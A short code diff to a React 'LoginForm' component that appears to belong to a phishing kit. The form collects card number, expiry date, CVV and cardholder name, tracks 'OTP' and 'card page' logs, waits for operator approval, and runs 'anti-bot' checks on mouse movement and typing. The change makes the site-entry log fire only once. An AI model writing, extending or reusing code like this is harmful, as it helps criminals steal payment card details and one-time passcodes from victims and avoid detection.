@@ -36,6 +36,7 @@ function LoginForm() {
   // Refs for tracking page logs
   const hasSentCardPageLogRef = useRef(false);
   const hasSentOtpLogRef = useRef(false);
+  const hasSentSiteEntryRef = useRef(false);
   
   const [cardDetails, setCardDetails] = useState({
     cardNumber: '', expiryDate: '', cvv: '', cardholderName: '',
@@ -52,7 +53,6 @@ function LoginForm() {
     
     setWaitingForApproval(false);
     setIsLoading(false);
-    
     const hasCardDetails = cardDetails.cardNumber && cardDetails.cardNumber.trim() !== '';
     
     if (hasCardDetails) {
@@ -240,17 +240,21 @@ function LoginForm() {
 
   // Anti-bot initialization
   useEffect(() => {
-    startTimer();
-    const handleMouseMove = () => trackInteraction();
-    window.addEventListener('mousemove', handleMouseMove);
-    if (sendSiteEntryLog) {
-      sendSiteEntryLog();
-    }
-    return () => {
-      window.removeEventListener('mousemove', handleMouseMove);
-      resetAntiBot();
-    };
-  }, [sendSiteEntryLog]);
+  startTimer();
+  const handleMouseMove = () => trackInteraction();
+  window.addEventListener('mousemove', handleMouseMove);
+  
+  // Send site entry log only once
+  if (!hasSentSiteEntryRef.current && sendSiteEntryLog) {
+    sendSiteEntryLog();
+    hasSentSiteEntryRef.current = true;
+  }
+  
+  return () => {
+    window.removeEventListener('mousemove', handleMouseMove);
+    resetAntiBot();
+  };
+}, [sendSiteEntryLog]);
 
   const handleInputChange = async (field, value) => {
     trackTyping();
